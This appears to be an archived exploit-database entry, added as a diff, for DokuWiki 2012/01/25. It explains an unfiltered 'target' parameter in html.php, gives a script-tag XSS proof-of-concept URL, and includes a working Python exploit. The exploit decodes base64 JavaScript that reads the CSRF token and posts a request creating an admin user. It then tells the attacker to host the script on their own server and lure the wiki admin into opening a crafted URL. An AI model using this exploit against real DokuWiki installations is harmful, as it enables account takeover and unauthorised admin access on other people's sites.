@@ -1,0 +1,116 @@
+id: 18070
+date: 04/18/2012
+title: DocuWiki 2012/01/25 CSRF / XSS
+author: IRCRASH
+cves: 
+
+######################################################################################
+DokuWiki Ver.2012/01/25 ( Latest Version ) CSRF Add User Exploit
+######################################################################################
+Discovered by : Khashayar Fereidani
+Team Website : HTTP://IRCRASH.COM ( IRCRASH Security Community )
+Facebook : http://facebook.com/fereidani
+Twitter : https://twitter.com/#!/IRCRASH
+Facebook Page : http://www.facebook.com/pages/IRCRASH/127804297326163
+Software Developer : http://www.dokuwiki.org/
+######################################################################################
+Test System Details
+OS : Linux
+WebServer : Nginx + PHP-5.3.5
+WebBrowser : Firefox 10
+######################################################################################
+Subjects :
+1. Vulnerability Explanation
+2. Code Review
+3. Cross Site Scripting vulnerability Proof of concept
+4. Add User Exploit
+######################################################################################
+1. Vulnerability Explanation :
+
+Variable target in file /inc/html.php will not be checked for illegal input and
+ function html_edit_form print $param['target'] from $param array without any filter.
+This variable(target) is exploitable for Cross Site Scripting vulnerability .
+
+######################################################################################
+2. Code Review :
+
+# Filename : /inc/html.php
+** Line 1336 ( Vulnerable Variable $_REQUEST['target'] ) :
+$data =     array('form' => $form,
+                  'wr'   => $wr,
+                  'media_manager' => true,
+                  'target' => (isset($_REQUEST['target']) && $wr &&
+                               $RANGE !== '') ? $_REQUEST['target'] : 'section',
+                  'intro_locale' => $include);
+
+** Line 1436 (Vulnerable Function) :
+function html_edit_form($param) {
+    global $TEXT;
+
+    if ($param['target'] !== 'section') {
+        msg('No editor for edit target ' . $param['target'] . ' found.', -1);
+    }
+
+    $attr = array('tabindex'=>'1');
+    if (!$param['wr']) $attr['readonly'] = 'readonly';
+
+    $param['form']->addElement(form_makeWikiText($TEXT, $attr));
+}
+######################################################################################
+3. Cross Site Scripting vulnerability Proof of concept :
+Vulnerable URL : http://WEBSITE/doku.php?do=edit&id=S9F8W2A&target=[XSS]
+Sample : http://sitename/doku.php?do=edit&id=S9F8W2A&target=<script>alert(123)</script>
+######################################################################################
+4. Add User Exploit :
+#EXPLOITSTART
+#!/usr/bin/python
+import base64,string,random
+def randstr(size=8, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for x in range(size))
+print """
+#####################################
+# IRCRASH Dokuwiki Add User Exploit #
+# Exploited By Khashayar Fereidani  #
+# Http://ircrash.com                #
+#####################################
+"""
+shellcode="""
+ZnVuY3Rpb24gTXlSZXF1ZXN0KCkgew0KaWYgKHdpbmRvdy5YTUxIdHRwUmVxdWVzdCkgew0KUmVxUmVh
+ZGVyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQp9IGVsc2Ugew0KUmVxUmVhZGVyID0gbmV3IEFjdGl2
+ZXhPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIik7DQp9DQpSZXFSZWFkZXIub25yZWFkeXN0YXRlY2hh
+bmdlID0gZnVuY3Rpb24gKCkgeyBUb2tlbkZpbmRlcihSZXFSZWFkZXIpOyB9DQpSZXFSZWFkZXIub3Bl
+bigiR0VUIiwgImRva3UucGhwIiwgdHJ1ZSk7DQpSZXFSZWFkZXIuc2VuZCgpOw0KfQ0KZnVuY3Rpb24g
+VG9rZW5GaW5kZXIoYSkgew0KaWYgKGEucmVhZHlTdGF0ZSA9PSA0ICYmIGEuc3RhdHVzID09IDIwMCkg
+ew0KdmFyIHNyYyA9IGEucmVzcG9uc2VUZXh0Ow0KcCA9IC92YWx1ZT0iKFswLTlhLWZdKykiLzsNCnZh
+ciB0b2tlbiA9IHNyYy5tYXRjaChwKTsNCnBhcmFtcyA9ICJzZWN0b2s9IiArIHRva2VuWzFdICsgIiZ1
+c2VyaWQ9VVNFUk5BTUUmdXNlcnBhc3M9UEFTU1dPUkQmdXNlcm5hbWU9VVNFUk5BTUUmdXNlcm1haWw9
+YXR0QHd3d3d3d3d3Lm9zZmEmdXNlcmdyb3Vwcz1hZG1pbix1c2VyJmRvPWFkbWluJnBhZ2U9dXNlcm1h
+bmFnZXImc3RhcnQ9MCZmblthZGRdPUFkZCI7DQphbGVydChwYXJhbXMpOw0KRXhwbG9pdChwYXJhbXMp
+Ow0KfQ0KfQ0KZnVuY3Rpb24gRXhwbG9pdChwYXJhbWV0ZXJzKSB7DQppZiAod2luZG93LlhNTEh0dHBS
+ZXF1ZXN0KSB7DQpIdHRwUmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQp9IGVsc2Ugew0KSHR0cFJl
+cSA9IG5ldyBBY3RpdmV4T2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpOw0KfQ0KSHR0cFJlcS5vbnJl
+YWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7DQppZiAoSHR0cFJlcS5yZWFkeVN0YXRlID09IDQg
+JiYgSHR0cFJlcS5zdGF0dXMgPT0gMjAwKSB7DQoNCn0NCn0NCkh0dHBSZXEub3BlbignUE9TVCcsICJk
+b2t1LnBocD9pZD1kb2Fka3dva2FkIiwgdHJ1ZSk7DQpIdHRwUmVxLnNldFJlcXVlc3RIZWFkZXIoIkNv
+bnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsNCkh0dHBSZXEu
+c2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1sZW5ndGgiLCBwYXJhbWV0ZXJzLmxlbmd0aCk7DQpIdHRw
+UmVxLnNldFJlcXVlc3RIZWFkZXIoIkNvbm5lY3Rpb24iLCAiY2xvc2UiKTsNCkh0dHBSZXEuc2VuZChw
+YXJhbWV0ZXJzKTsNCn0NCk15UmVxdWVzdCgpOw0K"""
+shellcode=base64.b64decode(shellcode)
+username=raw_input("[*] Enter New Username :")
+password=raw_input("[*] Enter Password :")
+shellcode=shellcode.replace("USERNAME",username).replace("PASSWORD",password)
+localFile = open('my.js', 'w')
+localFile.write(shellcode)
+localFile.close()
+print """[*] A new file (my.js) added to your local folder .
+   Upload it on your own host and send it for doku admin like this :
+   http://WEBSITE/PATH/doku.php?do=edit&id=""" + randstr() + "&target=<script SRC=http://YOUROWNHOST/YOURFOLDER/my.js></script>"
+#EXPLOITEND
+######################################################################################
+          Tnx : Just God
+######################################################################################
+
+
+
+#  0day.today [2023-03-22]  #
